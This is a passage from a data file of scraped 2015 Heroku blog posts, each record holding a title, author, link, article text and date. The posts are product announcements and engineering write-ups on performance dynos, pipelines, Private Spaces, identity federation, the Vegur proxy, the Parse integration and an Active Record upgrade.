more capable of debugging library internals, and helped our Ruby experience on the platform. Likewise having a huge number of diverse Rails apps running on the platform helps us be aware of actual pain points developers are hitting in production. It feels good when we can take these insights and contribute back to the community. Be on the lookout for the Rails 5 pre-release to give some of these changes a try. Thanks for reading, enjoy the speed. If you like hording RAM, maximizing iterations per second, or just going plain fast follow @schneems . rails performance", "date": "2015-08-05,"},
{"website": "Heroku", "title": "Introducing Improved Performance Dynos", "author": ["Brett Goulder"], "link": "https://blog.heroku.com/introducing-improved-performance-dynos", "abstract": "Introducing Improved Performance Dynos Posted by Brett Goulder August 20, 2015 Listen to this article Last year, we launched the original Performance dyno, designed to support the largest apps running at-scale with more consistent service and faster response times. Today, with the goal of continuing to support our fast growing customers with more flexibility to choose the type of dynos best for their applications, we are excited to announce improvements to our performance dyno lineup: Performance-L — an improved and more powerful version of the existing Performance dyno, renamed the Performance-L dyno Performance-M — an entirely new dyno and smaller sibling to the Performance-L dyno The Performance-L dyno now has 14GB of RAM, 133% more RAM than the previous version, answering a request from many of our largest customers. We’ve also upgraded the underlying virtual compute instance for Performance-L dynos to the latest generation, ensuring better performance for the largest, most demanding high traffic applications. We’ve made both of these improvements without changing the price. The new Performance-M dyno comes with 2.5GB of RAM — two and a half times more than the top-of-the-line Standard-2X dyno —coupled with more compute resources. Just like the Performance-L dyno, Performance-M dynos execute in LXC containers, each of which fully occupies the underlying virtual compute instance. Each Performance-M dyno is dedicated to a single customer, which means that customer gets the benefit of an entire virtual machine with that dyno. This architecture translates to highly consistent and faster response times, including reduced 99th percentile latencies , for high traffic applications. By improving and expanding the performance line of dynos, customers now have much more flexibility to choose both the type and number of dynos best for their applications. At the high end, Performance-L dynos are more powerful and performant than ever. The new Performance-M dyno type gives customers a middle path between Standard-2X and Performance-L, and suits intermediate use cases where a smaller number of Performance-M dynos will deliver better results than a larger number of Standard-2X dynos. The New Performance-M Dynos Below the surface, a Performance-M dyno runs in an LXC container that fully occupies an entire current generation virtual compute instance, with reduced dyno boot times and latency. The result is that apps running on these instances will have more CPU time spent executing the app’s processes, and less time on system processes. Overall, these upgrades allow more customer applications to achieve the consistent and predictable performance that customers have long enjoyed from our performance dyno type. Performance-M dynos are available immediately, and applications can be migrated in seconds. In both the US and EU regions, these dynos can be used for $250 per month, prorated to the second, and provisioned through the Heroku Dashboard or Toolbelt. $ heroku dyno:type web=performance-m An Upgrade to the Performance Dyno The Performance dynos that our customers have relied upon for the past year have been upgraded and renamed to Performance-L. The available memory for each Performance-L dyno has been increased from 6 GB to 14 GB and the underlying hardware has also been upgraded to also include SSDs. These dynos will continue to cost $500 per dyno per month, prorated to the second . The full lineup of Professional dynos are: dyno type memory compute price standard-1x 512MB 1-4X $25/mo standard-2x 1GB 2-8X $50/mo performance-m 2.5GB 12X $250/mo performance-l 14GB 50X $500/mo During tests, our customers have seen, on average, a 20% to 30% improvement in response time after moving from the previous generation performance dyno to the new Performance-L dyno. All applications currently running on performance dynos have been automatically upgraded to the new offering. New customers interested in using these dynos for their applications can get started today. $ heroku dyno:type web=performance-l Conclusion We strongly believe that our customers will benefit from the improved performance offered by Performance-M and Performance-L dynos .  We welcome your feedback — let us know what you think . performance dynos performance-m performance-l", "date": "2015-08-20,"},
{"website": "Heroku", "title": "Introducing Heroku Flow: Pipelines, Review Apps, and GitHub Sync for Continuous Delivery", "author": ["Ike DeLorenzo"], "link": "https://blog.heroku.com/heroku_flow_pipelines_review_apps_and_github_sync", "abstract": "Introducing Heroku Flow: Pipelines, Review Apps, and GitHub Sync for Continuous Delivery Posted by Ike DeLorenzo September 03, 2015 Listen to this article Editor's Note: Heroku Pipelines is now Generally Available.  Learn more about Continuous Delivery at Heroku . At Heroku we're building a solid platform for delivering apps in a deliberate, reliable manner.  We know that reasoning about the state and progress of code changes, testing and verifying what's deployed, and tracking what works can all be difficult — especially for non-engineering team members. So we’re proud to introduce Heroku Flow, a new and flexible way to structure, support, and visualize Continuous Delivery for Heroku apps from development to production.  Heroku Flow does for Continuous Delivery (CD) what pull requests have done for code review: make CD visual, easy to manage, and accessible to all team members from design, to engineering, to product management, to QA and testers. It does this with the support of three features and integrations: Pipelines: a clear and structured workflow for a group of apps that share the same codebase GitHub Sync: automatic or manual deployment of Pull Requests (PRs) on branches to staging apps Review apps: automatic creation of a disposable “Review App” for each new GitHub PR. Introducing Pipelines The backbone of Heroku Flow is Heroku “Pipelines” , out now in public beta. The Pipelines interface — a new page you'll notice in your Heroku web interface — facilitates and visualizes the best practices in CD that we all know and love: frequent iteration, test, deployment to staging, and promotion to production. The “Pipeline,” strictly speaking, is a clear and structured workflow for a group of apps that share the same codebase. Initially we will support four stages: “review” (read on), \"development,\" \"staging,\" and \"production.\" Many of our customers are already adopting the convention of naming apps this way: “my-app-dev,” “my-app-staging,” “my-app-prod.” We are now codifying that pattern, and managing the journey of the code through these stages. You’ll find that Pipelines is quite smart about recognizing existing apps you’ve named this way and placing them in the right stage. Apps can be “promoted” to the next stage in the Pipeline with a click in the web interface, or by using the CLI . In either case, the relationship between the stages of your apps in the Pipeline is always clearly diagrammed live on the Pipelines page (e.g. you might see that production is behind master by three commits). Awareness of the current relationships between apps in a pipeline will provide a better view of the state of development of apps of all kinds. Works with GitHub Sync When a given PR is merged, and the code merged to master (or another branch of your choice), Heroku can automatically deploy the branch to staging, via our GitHub Sync that was released for GA in May. Or you can choose to deploy manually within the Heroku interface. Pipelines can be configured to deploy specific branches to specific apps when pushes occur, either automatically, or manually as needed. Review Apps in the Flow Heroku Review Apps , now also in beta, makes Pipelines even more interesting.  For each new GitHub pull request (“PR”), Heroku will spin up a disposable “Review App” with a unique URL for the development team to review and test. Now, instead of guessing what the new code might do, reviewers — including designers, testers, and PMs — can receive a link and actually try it out in a browser, before the code reaches staging or production environments. Review Apps are also visualized live in the Pipelines area of the Heroku web interface. When PRs are created in GitHub, or builds finish, Review Apps or deployments will appear in the Heroku Pipelines overview. And the workflow and features are all compatible with orgs and fine-grained access controls, in ways that make sense for the roles involved.  Different users may have different permissions on apps in various stages, so that only certain users, for example, may promote to staging.  Orgs can track usage of Review Apps (and are billed for the dynos and add-ons that get used). Review Apps provide easier and better testing for features and fixes in isolation, and Pipelines provides better structure for testing and deploying the resulting app. It’s all part of Heroku Flow: better structure for teams to iterate, test, deploy, and run software. -- Join the conversation around Heroku Pipelines on Twitter .", "date": "2015-09-03,"},
{"website": "Heroku", "title": "Customer Centered E-Commerce: Salesforce + Heroku ", "author": ["Margaret Francis"], "link": "https://blog.heroku.com/customer_centered_e_commerce_salesforce_heroku", "abstract": "Customer Centered E-Commerce: Salesforce + Heroku Posted by Margaret Francis September 09, 2015 Listen to this article Today we are releasing a reference architecture and sample app for running e-commerce apps on Heroku, with a simple pattern for integrating customer, order and product data with Salesforce via Heroku Connect.  The documentation and open source repo can be found on GitHub.  The key: Any transaction recorded in Heroku Postgres can be seamlessly integrated with Salesforce via Heroku Connect . Salesforce for E-Commerce Many Salesforce customers are looking to extend their Salesforce deployments with e-commerce on Heroku.  Whether running a single storefront, launching new concepts and brands, or innovating to improve core retail functions, these e-commerce experiences require orchestration across multiple business functions that already use Salesforce. Common Salesforce use cases include: Creation and maintenance of all customer information in the CRM system of record, including order history Purchasing on customer specific pricebooks, contracts or purchase orders Management of product catalog data using roles and workflows Creation and administration of promotions and campaigns Agent driven updates to prices, orders, and data (returns, cancellations, changes of address) Data consolidation for business and customer analytics and insight. These companies choose Heroku for their e-commerce runtime environment because they: Need high-fidelity, highly bespoke e-commerce experiences Prefer using the languages/ technologies they already know (Node, PHP, Ruby, etc.) Want to deliver a mix of desktop and mobile browser/app experiences via a single PaaS Want to get started fast, on a service with proven scale in production. Some of these reasons have been discussed by Heroku customers running e-commerce sites on Heroku, such as Soylent and Macy’s .  This particular reference architecture uses Spree .  There are other examples, such as this AppExchange App for Magento created by a Heroku partner, which use a similar Salesforce data synchronization approach and likewise runs on Heroku. The FIX E-Commerce Reference Architecture and Sample App The sample app we are sharing today features a fictional coffee equipment shop called FIX. Built in Ruby and designed for use at different browser sizes, it has many of the e-commerce functions common to the apps that our customers run on Heroku, including different merchandising modes, a product catalog, shopping cart, and checkout. Developers seeking to bootstrap a full e-commerce store will need to extend the sample with their own payment gateways, messaging providers, fulfillment vendors etc.  What make this sample app different is how it connects into the Salesforce ecosystem: Orders attach to Contact records, service reps can cancel orders from within Salesforce, marketing can update product descriptions inside Salesforce and changes will be automatically pushed out to users. This reference architecture demonstrates how to unify a representative e-commerce data model with the Salesforce system of record to deliver shopping experiences that are tightly integrated across all customer touchpoints.  Contributions that help to improve the sample app, or add new e-commerce use cases, are welcome via pull requests on the repo. HerokuConnect Force.com salesforce cxpatterns cx ecommerce spree magento", "date": "2015-09-09,"},
{"website": "Heroku", "title": "Integrated security with Heroku Identity Federation", "author": ["Balan Subramanian"], "link": "https://blog.heroku.com/integrated_security_with_heroku_identity_federation", "abstract": "Integrated security with Heroku Identity Federation Posted by Balan Subramanian September 10, 2015 Listen to this article Apps are at the heart of modern businesses, and are important assets that need a secure platform geared for compliance and security. We launched Heroku Enterprise earlier this year with this in mind and today we are excited to announce the beta of Heroku Identity Federation for Heroku Enterprise customers. This feature unifies the login experience across Salesforce's new App Cloud that we announced today. As customers like Forever Living , TV4 and Macy’s run more of their apps and business-critical services on Heroku, they need tighter integration with their existing security infrastructure. With our new identity federation feature, customers can confidently meet compliance mandates such as password complexity requirements, rotation policies, access restrictions and onboarding / offboarding procedures, without having to re-implement them on Heroku. Introducing Heroku Identity Federation Heroku Identity Federation allows access to a Heroku organization to be managed through a third party identity provider (IdP) such as Salesforce Identity or Microsoft Active Directory. Many organizations already use such systems for managing employee access to business systems. Once you set up an organization for identity federation, users logging into the organization are redirected to the identity provider for authentication. After a successful login with the IdP, they are directed back to the Heroku Dashboard for the organization. When a user successfully logs in for the first time through this flow, they are added as members to the org. As members, they can view existing apps and create new apps. They can also be granted more privileges on specific apps. Setting up an organization for Identity Federation For the beta, we are enabling SAML based integration, which will allow you to configure an organization for identity federation with various SAML compliant identity management products, such as Salesforce Identity and Microsoft Active Directory Federation Services. Heroku organization admins can configure identity federation in the Settings page of the organization in the Heroku Dashboard. Please see the Setting up your Heroku Enterprise organization for identity federation Dev Center article for more details. Once configuration is complete, identity federation is enabled and a Heroku Login URL that is unique to your organization is shown in the Settings page. You can email it to all users that you want to allow access to the organization or place it in a shared location such as a single sign-on (SSO) portal or an intranet webpage. Logging into a federated organization Users login to a identity federated organization by navigating to the org specific URL such as https://sso.heroku.com/saml/sushi-inc/init . They are redirected to the identity provider and on successful authentication redirected back to the Heroku Dashboard page for the org. Once a user is logged in, they are granted a token that gives them access to the organization and the apps in it. This token expires every 8 hours after which users will have to re-authenticate with the identity provider. Users can also continue to use the Heroku CLI as they normally would. When they log in for single sign-on through the CLI, a browser instance is fired up allowing them to authenticate with the identity provider. On successful authentication, they are presented with an access token that they can use to configure their CLI session. Onboarding and offboarding When new employees join, they are typically provisioned an user record in the identity provider, and can then log into the Heroku organization through the org specific login URL. An org admin can also immediately add them as a member which sends them the unique URL for the org in an invite email. Administrators often prefer a centralized mechanism to revoke a user’s access to business systems when the user leaves the company. When an employee is removed from the identity provider, they can no longer log into the Heroku organization. If they are already logged in, any tokens that they have been issued will expire within 8 hours after which they will no longer be able to access the organization or its apps. You can also immediately remove them by calling this API . Managing users Once an organization is set up for identity federation, admins no longer have to add users. Anybody who has access to the Heroku login URL and can successfully authenticate with the identity provider will automatically be added a member on their first login. Existing members can log in using their Heroku username and password. The first time they log in through the IdP, they are converted to a federated user and subsequently can login only through the IdP. Organization members that use a Heroku username and password are highlighted as 'Not federated' in the organization access page, enabling you to quickly scan for members that don't use SSO. You can also see the 2FA status of such users in the org access page. If you want to allow access only through your identity provider, you can remove all such non-federated users from the org. On the other hand, you can also allow some users who may not be able to log in through the identity provider, such as contractors, to access the organization (or specific apps) using their Heroku username and password. Next steps We are very excited about bringing identity federation to our customers as a beta feature of Heroku Enterprise . Please sign up for the beta and we will be in touch shortly. For feedback and questions, contact us at enterprise-feedback@heroku.com . saml identity access control Heroku Enterprise Salesforce Identity", "date": "2015-09-10,"},
{"website": "Heroku", "title": "Introducing Heroku Private Spaces: Private PaaS, delivered as-a-Service", "author": ["Jesper Joergensen"], "link": "https://blog.heroku.com/heroku_private_spaces_private_paas_delivered_as_a_service", "abstract": "Introducing Heroku Private Spaces: Private PaaS, delivered as-a-Service Posted by Jesper Joergensen September 10, 2015 Listen to this article As the world becomes more cloud-centric, and more of our apps and business depend on its capabilities, the trust, control and management of cloud services is more important than ever.  Since the first days of Heroku  — and Platform-as-a-Service in general  — many companies have struggled to balance the impact and success of the cloud with the control offered by traditional software and on-premise infrastructure.  Too often that balance tips back towards software, with companies choosing to meet those requirements by building and running their own platforms, inevitably becoming frustrated by the resulting complexity, cost and poor experience. Today Heroku is introducing Private Spaces, a new Heroku runtime that delivers the best of both worlds; the simplicity and success of the cloud, combined with the network and trust controls historically only available with on premise, behind the firewall deployments.  Available today in public beta, Private Spaces is powered by Heroku Dogwood  — an all-new runtime architecture that augments the current Cedar runtime. Spaces are being released as part of Salesforce’s new App Cloud , also launching today. Heroku Private Spaces A Heroku Private Space contains all of the familiar elements of a Heroku app, including dynos and data services.  These elements are deployed and run in network isolated environments, separating the “private” application, including its associated data, from the “public” systems that keep it up, running and healthy. The new mix of multi-tenant control plane with private runtimes is what makes this architecture unique, and allows it to share an identical development and deployment experience with the Heroku you know today. You develop and deploy apps in Private Spaces just like you would normally on Heroku; Heroku Button, git push deployments, review apps, pipelines, seamless scaling, self healing and Elements Ecosystem  — are all included in Private Spaces. Even better, this isolation architecture also allows for more geographic control; Spaces can be deployed in Frankfurt, Germany, Tokyo, Japan, or in the United States in either Virginia or Oregon, with more regions to be added in the future. Using Private Spaces Creating a Private Space is as simple as executing a single command $ heroku spaces:create acme-prod Once provisioned, the Heroku experience is the same as you use today, with the addition of a new space flag: $ heroku create myapp --space acme-prod You can also create and manage spaces from the dashboard: Once created, the space becomes a deployment target for your apps, much like Cedar is implicitly today.  You can create multiple apps within a space, each with its own set of dynos and add-ons; since they share a space those apps will share a network boundary and associated network controls.  And those apps and spaces can sit alongside your Cedar apps; it is expected that developers will use both Private Spaces and traditional Heroku depending on the requirements and development stage of a given app. Most importantly, there are no additional configuration or operational requirements to use your space; it runs and scales just like the rest of Heroku.  Under the hood, the components that comprise a space are run and managed automatically - despite the fact that spaces are private, there is no additional operational burden for developers using them. Global Regions Since Private Spaces are discrete, self contained Heroku runtimes, they can be deployed with new kinds of flexibility - including new geographic options.  As part of provisioning a space, you can specify one of the newly supported regions. $ heroku spaces:create acme-jp --region tokyo From there, the rest of the experience is transparent, and any operation associated with that space - including creating new apps, scaling dynos or even adding Postgres or Redis data stores, will automatically happen in that region.  Note that Heroku's core services, such as git repos, app builds and the control API service, are located in the Virginia region and will not be local to spaces running elsewhere. Secure Enterprise Service Connectivity Applications in a Private Space reside in an isolated virtual network with access controlled at the network level. Space administrators can choose from which other networks applications can be accessed and thanks to a built-in NAT gateway, apps in a Private Space can be granted access to restricted services in other networks using IP allowlisting. This makes it easy to create a secure production environment for Salesforce applications where Heroku dynos and databases can process and store customer data within a secure, locked-down network boundary. Similarly, Heroku apps can now be securely integrated with on-premise services protected by network access controls allowing developers to move more workloads to the cloud. Private Data Services Few applications consist of just running code. One of the most critical parts of an application from a security and governance perspective is the database. The ease with which data services can be added and managed on Heroku has always been critical to rapid delivery and the overall experience. Data services in Private Spaces are exactly as easy to create and manage as they have always been. Simply add the add-on as usual: $ heroku addons:create heroku-postgresql:standard-4\nCreating postgresql-triangular-2817... done\nAdding postgresql-triangular-2817 to myapp... done\nSetting DATABASE_URL and restarting myapp... done, v3\nThis database will be created in a private space. Heroku automatically detects that the app is in a Private Space and sets up a new database within the Private Space. You can verify this by looking at the DATABASE_URL : $ heroku config:get DATABASE_URL\npostgres://udv...:pd0...@10.1.32.86:5432/db36mo7ajub9dg The database host has an IP address in the non-publicly-routable 10.0.0.0/8 address space and cannot be accessed directly from the Internet. The same is the case for Heroku Redis. The data services can only be accessed from dynos in the same Private Space and via a bastion host by users with explicitly granted access and valid Heroku credentials. Dyno Networking Dynos running in a Private Space are connected to a single private dyno network allowing dynos to communicate with each other using any TCP or UDP port and protocol. This lets you do new and interesting things with your Heroku apps. For example, web dynos can communicate with each other and share session state over a gossip protocol. Web and worker dynos can communicate with each other without going over the public Internet. Dynos from different applications can even talk to each other as long as they are in the same Private Space. This can be useful for deploying diagnostics applications that consume diagnostics streams from other application dynos over the private network. Space Access Controls Being part of Heroku Enterprise , Private Spaces take full advantage of fine-grained access controls. Access control can be delegated to apps inside Private Spaces allowing organizations to manage large application portfolios without unnecessary bureaucracy. The new network controls allow for elegant separation of responsibilities where Space administrators control network access while developers retain maximum self-service deployment without compromising security. Learn More You can learn more about Private Spaces by attending our technical deep dive on October 8th, where we’ll walk through a live demo and go deeper into different use cases. If you’re attending Dreamforce, you definitely want to attend the Private Spaces session on Thursday at 12pm or stop by the Heroku area in the Dev Zone anytime to get a live demo. You can also hear from a current participant of the Heroku Private Spaces limited beta on Friday at 10am with Align Technology, who’ll be sharing their experiences using Private Spaces for multi-region and network-isolated applications. Heroku Private Spaces is in limited beta today; you can get on the list to participate in the betas today.", "date": "2015-09-10,"},
{"website": "Heroku", "title": "Heroku Proxying becomes Free Software", "author": ["Fred Hebert"], "link": "https://blog.heroku.com/vegur-free-software", "abstract": "Heroku Proxying becomes Free Software Posted by Fred Hebert October 20, 2015 Listen to this article HTTP routing on Heroku is made up of three main logical layers: The state synchronization layer ensures that all nodes in the routing stack are aware of the latest changes in domains, application, and dyno locations across the platform; The routing layer chooses which dyno will handle an HTTP request ( random or sticky ), performs logging, error-reporting, and so on; The HTTP proxying layer  handles the validation, normalization, and forwarding of requests between clients and dynos. This last part is the one the platform team is happy to open-source today with the Vegur library. Vegur can be thought of a bit like an nginx reverse-proxy, except its entire list of hosts and configuration is fully programmable, making it easy to hardcode, use files, use databases, or push state updates directly into the proxy and router states, while also allowing the same dynamism for features such as routing algorithms, choice of debugging headers, and so on. This turned out to be a critical feature that few or none of the existing proxying mechanisms could support at a scale the size of Heroku. Vegur has been written in such a way that any compatible router could use it for its proxying job without compromising on the routing logic itself, making it easier to focus on higher level tasks. It allows the following parts, to name a few, to be delegated to an Erlang code base: domain name lookup selection of one out of many back-ends for a domain choice of interface for a given back-end checkout/checkin mechanism for resource management customizeable error pages for every potential kind of failure during the proxying of a request per-application (or even per-backend) control of features such as tunneling of 100-continue requests ability to add headers both upstream and downstream Everything is documented in the README of the project with example code, samples, and examples. Vegur has been used in production for over a year on the Heroku platform, and is also currently used to power the router in Heroku Private Spaces . We hope this makes it easier for the community at large to develop interesting routing products, and enriches the ecosystem as a whole. routing", "date": "2015-10-20,"},
{"website": "Heroku", "title": "Announcing Heroku + Parse: Flexible Platform Meets Feature-Rich SDKs", "author": ["Matthew Creager"], "link": "https://blog.heroku.com/heroku-plus-parse", "abstract": "Announcing Heroku + Parse: Flexible Platform Meets Feature-Rich SDKs Posted by Matthew Creager October 22, 2015 Listen to this article Most modern mobile apps depend heavily on the app’s back-end.  That’s because many of the expectations users have for mobile apps today -- for the application to work regardless of network connectivity, to notify them when relevant content changes, to have integrations with the social networks they use, for appropriate levels of security, and a hundred other things -- are reliant on the app’s back-end services. The most common pattern for mobile back-ends we see today is for developers to design, build and maintain their back-end architectures on Heroku. This approach is as flexible as it is powerful, but it requires significant engineering effort.  A faster alternative would be to use a service like Parse.  Using the Parse SDKs gets you some great services right out of the box. However, if you need to add customized functionality to your application at scale, there just isn't a simple way to do it. We’re pleased to announce the first results of a partnership between Heroku and Parse aimed at delivering the best of both worlds.  Today we’re making available an integration between Heroku and Parse’s Cloud Code product. This combination gives you the flexibility and customization of the Heroku platform and the convenience of Parse’s cross-platform mobile SDKs.  This is just the beginning, and as we continue to work together on extending and improving the integration, we welcome your feedback . Watch this screencast for a 3-minute overview of how this works, and then read on to see how you can begin using Heroku and Parse together today. How this works To begin taking advantage of the integration, you'll need a Parse account, a Heroku account and the respective CLI tools. Let's start by using the Parse command line tool to provision a new Parse app. $ parse new We'll be prompted to choose an existing Parse app, or to create a new one and name it. Let's create a new one: Would you like to create a new app, or add Cloud Code to an existing app?\nType \"(n)ew\" or \"(e)xisting\": n Next, we select Heroku as our provider: Which of these providers would you like use for running your server code:\n  1) Heroku (https://www.heroku.com)\n  2) Parse  (https://parse.com/docs/cloudcode/guide)\n       Type 1 or 2 to make a selection: 1 Note: If your Heroku account isn't linked to your Parse account, it's at this point that you'll be directed to the appropriate settings page. The Parse CLI will finish by generating the Node Express scaffolding. Now we can cd into our new project directory, and deploy it to Heroku: $ cd Parsoku/\n$ parse deploy That's it; you have the full power of Heroku’s developer experience, combined with the convenience of Parse’s cross-platform mobile SDKs at your disposal. Taking it up a level We've provisioned new Parse and Heroku apps, generated an Express server, and deployed it to Heroku. Not a bad start, but we're not finished yet. The Heroku add-ons ecosystem includes a wide selection of services that we can use to add functionality to our Express server. Let's use the SendGrid add-on to welcome new users. Note: Parse does not add a User class by default. Add the User class via the Parse dashboard before continuing. First we'll provision the add-on: $ heroku addons:create sendgrid -a parsoku-app-name Which made our SendGrid credentials available to our app via config vars, you can inspect those using the Heroku toolbelt : $ heroku config -a parsoku-app-name We'll also need to install the SendGrid library : $ npm install sendgrid --save With our SendGrid add-on ready to go, we can use the config var added through the provisioning process in tandem with the library we installed to send a welcome message each time a user signs up. It's time to customize the Express server: // /cloud/main.js\n\nvar Parse = require('parse-cloud-express').Parse;\nvar sendgrid = require('sendgrid')(process.env.SENDGRID_USERNAME, process.env.SENDGRID_PASSWORD)\n\nfunction sendWelcome(email) {\n  var opts = {\n    to: email,\n    from: 'creager@heroku.com',\n    subject: 'Welcome to webscale mobile apps',\n    text: 'Welcome, and thanks for signing up!'\n  }\n\n  sendgrid.send(opts, function(err) {\n    if (err) {\n      console.error('unable to send via sendgrid: ', err.message);\n      return;\n    }\n\n    console.info('sent to sendgrid for delivery')\n  })\n}\n\nParse.Cloud.afterSave('_User', function(request, response) {\n  if (request.body.object.email) {\n    sendWelcome(request.body.object.email);\n  }\n\n  response.success();\n}); Now we add and commit the changes we've made via git: $ git add cloud/main.js package.json\n$ git commit -m \"Welcome new users\" Finally, we're ready to deploy the latest version of our Express server: $ parse deploy You can test that it's working by visiting the Parse dashboard and manually adding a user. Use either the Heroku toolbelt or Parse command line tool to peek under the hood: $ parse logs -f We can't wait to see what you build with this integration, as always we welcome your feedback , issues and of course PRs. Both the Parse CLI and Express scaffolding are open source, and available on GitHub. mobile parse", "date": "2015-10-22,"},
{"website": "Heroku", "title": "How We Migrated to Active Record 4", "author": ["Owen Ou"], "link": "https://blog.heroku.com/upgrading-to-active-record-4", "abstract": "How We Migrated to Active Record 4 Posted by Owen Ou November 03, 2015 Listen to this article If your application is successful, there may come a time where you’re on an unsupported version of a dependency. In the case of the Heroku Platform API , this dependency was a very old version of Active Record from many years ago. Due to the complexity involved in the upgrade, this core piece of infrastructure had been pegged at version 2.3.18, which was released in March 2013. We're happy to announce that we've overcome the challenge and are now running Active Record 4.2.4, the latest version, in production. In this post, we'll describe the technical challenges we faced in the upgrade process and take a look at how your organization could benefit from upgrading legacy software dependencies. Maintenance Burden As mentioned, we were stuck with a very old version of Active Record for several years. In fact, in mid 2013, we made an attempt to upgrade to Active Record 3.2.13 but we ended up abandoning the effort, because through some micro-benchmarking we found that version of Active Record was 40% slower. As time went by, not using the latest version of Active Record gradually became a maintenance burden for us. Active Record 2 support ended in late 2013 and we had to backport security patches and features to our codebase. For features like filters , we had to build our own query-building infrastructure instead of using the one from Active Record 3+. Adequate Record was introduced in Active Record 4 and we hoped it could improve our app’s performance. With all that in mind, we decided to give the upgrade another shot. Upgrade Path We first upgraded from the latest Active Record 2.x (v2.3.18) to the latest Active Record 3.0.x (v3.0.20). This greatly reduced the risks of the whole upgrade process because Active Record 3.0.x preserves all of the APIs of Active Record 2.x . We spent minimum effort to level up to 3.x and most of our Active Record code continued to work. It ended up taking one engineer working on it full time for about two weeks. This strategy was different from the effort we made in mid 2013 when we tried to upgrade directly to Active Record 3.2.13. Next, we upgraded from Active Record 3.0.20 to the latest Active Record 4.2.4. We didn’t take small steps this time because most of our efforts were to get rid of the deprecated Active Record 2 syntax. It’s also not as hard to go from Active Record 3.1 to Active Record 4. Some of the gems we use, like acts_as_paranoid , don’t have great support for Active Record 3.1.x so skipping Active Record 3.1.x+ also freed us from fixing these gems to work with a particular version of Active Record. Besides, upgrading to the latest Active Record version allowed us to cut down the number of Active Record patches we introduced, since most of them are now part of the latest Active Record version. This step was a bit demanding compared to the previous one and it took two engineers working on it full time for about two weeks. The upgrade to Active Record 3.2.13 that we attempted in mid 2013 resulted in a drop in performance but we accepted the temporary drop this time because our end goal was to migrate all the way to the latest Active Record, which presumably would give us acceptable performance due to Adequate Record. However, as we describe below, the performance didn’t drop from Active Record 2.3.18 to 3.0.20 and it didn’t increase as we had hoped when we migrated from Active Record 3.0.20 to 4.2.4. Process Upgrading such large group of components is hard. Upgrading such large group of components with no downtime is even harder. The Heroku CLI , dashboard , add-ons and other parts of the ecosystem all interact with the Heroku Platform API. We have to maintain high availability. In this section, we’re going to share how we rolled out the upgrade with zero downtime. We worked on a feature branch as we upgraded the code. Because the upgrade process took a relatively long time, we kept syncing the feature branch with the master branch by rebasing often. We also cleaned up code as we upgraded. Some fixes were committed to the master branch directly and were then merged into the upgrade branch upon each rebase. The first thing we did to the code was to bump Active Record and Active Suppport to a targeted version. It broke quite a lot of code but that was expected. The next thing we did was to fix enough code to get our Ruby console to work. For us, this step involved upgrading gems and patches that depended on Active Record and Active Support. It also involved fixing code that relied on removed APIs and adjusting the loading order of some code. To fix the console, we started the console, saw what errors it raised, fixed the errors and repeated the steps until it booted up. A nice benefit of having a running console first was that we could experiment with arbitrary code in the console which saved us a lot of time when debugging in subsequent steps. As the last step, we let our automated tests drive the upgrade process. We fixed code to get tests to pass. One small tip for this step is: for a multi-layered app, we recommend upgrading in the order of models, services, controllers and then the rest. Fixing models first, then layers above it one by one yields the most effective path because fixing a lower layer may end up fixing a couple of issues on an upper layer. To test the upgraded code, we mostly relied on our existing automated tests. We don’t have 100% test coverage but our tests were good enough and helped us to upgrade most of the code correctly. We also added tests and cleaned up tests where necessary. Besides, as part of the Heroku infrastructure, we run a set of acceptance tests against our API after each deployment to verify the deployment doesn’t break anything. We find them extremely useful for detecting problems and we recommend them for risky code changes like an Active Record upgrade. To verify that the upgraded code worked, not only did we start the server locally, but we also deployed it to a remote server. At Heroku, each engineer can deploy a copy of Heroku to a server for testing purposes (their own \"private\" Heroku). This provides us with the flexibility to check for potential errors before contaminating staging or production environments. We deployed, ran the acceptance tests, manually tested a couple of typical scenarios, found missed bugs, wrote tests to reproduce the bugs, fixed them, and repeated again until all errors were resolved. To further reduce the risk of the upgraded code, we deployed it to a staging environment and left it running for a few days. Our staging environment simulates our production environment and most importantly, it has a lot of production-like data in the database. Letting risky changes bake in a production-like environment gave enough time for \"hidden\" bugs to pop up. For example, by chance, due to a database incident in our staging environment, we discovered issues in our patch to Active Record that auto-reconnects to a database. If we had already deployed the upgraded code to production, this might have caused us a production incident. At Heroku, we take production deployment seriously. For any risky changes, we first do partial rollout. For the upgraded code, we deployed it to a small percentage of traffic. Doing a partial rollout not only allowed us to look for missed errors in a real production environment, but also minimized the risks. It also allowed us to monitor performance characteristics of the upgraded code side-by-side with the pre-upgraded code (more details below). Because we worked hard to reduce the risk of our changes ahead of time, the deployment to production went smoothly with no downtime, although in one occasion, we rolled back immediately due to a bug related to a missed case for acts_as_paranoid . Performance According to our abandoned upgrade to Active Record 3.2.13 in mid 2013, we thought we would need to pay the performance penalty when upgrading from Active Record 2 to 3. To our surprise, the performance of Active Record 3.0.20 was about 18% better than Active Record 2.3.18 for us. The graph below shows overall request latency. The lower the latency, the better. We thought we would have better performance when upgrading from Active Record 3 to 4 due to Adequate Record. Surprisingly, the performance of Active Record 4.2.4 was 13% worse than Active Record 3.0.20. The graph below shows overall request latency. Our initial conclusion is that our request latency is dominated by database query time so the performance of the ORM doesn’t matter much. We also concluded that micro-benchmarking is not an accurate way to measure the overall performance of an application. Our concerns about paying a performance penalty when upgrading from Active Record 2 to 3 and our hope for better performance from Active Record 3 to 4 don’t hold. This also brings up an interesting lesson learned: always benchmark changes with your app in production . Conclusion Overall, we are very happy with the upgrade. It cleans up many of our patches to Active Record and it gives us many features like the query-building infrastructure. Besides, the outdated Active Record was dropped from security updates and we are now using a supported version. Also, performance has stayed at the same level as it was before the upgrade. For future Active Record updates, it will be easier and quicker for us. Training new employees will also be easier now that we're on the \"current\" Active Record version. If you’re thinking about upgrading a legacy dependency in your codebase, the sooner you upgrade, the easier it will be to maintain. api upgrade", "date": "2015-11-03,"},
